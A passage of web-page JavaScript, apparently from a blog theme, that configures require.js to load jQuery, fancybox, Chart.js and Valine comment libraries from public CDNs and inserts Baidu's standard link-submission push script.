    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script> <script type="text/javascript">
                  ;(function() {
                    var bp = document.createElement('script')
                    var curProtocol = window.location.protocol.split(':')[0]
                    if (curProtocol === 'https') {
                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
                    } else {
                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
                    }
                    var s = document.getElementsByTagName('script')[0]
                    s.parentNode.insertBefore(bp, s)
                  })()
                </script> 
